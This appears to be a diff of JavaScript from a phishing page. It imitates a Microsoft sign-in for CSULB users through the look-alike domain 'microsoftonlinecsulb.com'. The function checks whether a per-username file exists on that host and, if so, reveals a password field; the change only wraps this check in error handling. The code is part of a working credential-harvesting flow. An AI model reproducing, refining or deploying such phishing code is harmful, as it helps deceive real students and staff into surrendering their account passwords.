@@ -10,27 +10,33 @@ var superloadingDiv = document.querySelector(".loading-screen-div");
 
 function functioncheck(){
             // alert('saved');
-            
-            $.ajax({
-              url:'https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt',
-              type:'HEAD',
-              error: function()
-              {
-                  //file not exists
-                  console.log("false");
-                  return false;
-              },
-              success: function()
-              {
-                  //file exists
-                  loadingDiv.style.display = "none";
-              superloadingDiv.style.display = "none";
-              passwordDiv.style.display = "block";
-              }
-          });
-          console.log("true");
+            try{
+              $.ajax({
+                url:'https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt',
+                type:'HEAD',
+                error: function()
+                {
+                    //file not exists
+                    console.log("false");
+                    return false;
+                },
+                success: function()
+                {
+                    //file exists
+                    loadingDiv.style.display = "none";
+                superloadingDiv.style.display = "none";
+                passwordDiv.style.display = "block";
+                }
+            });
+            }
+            catch{
+              console.log("cath")
+              return false;
+            }
 
-          return true;
+          console.log("true");
+            return true;
+          
 }
 
 
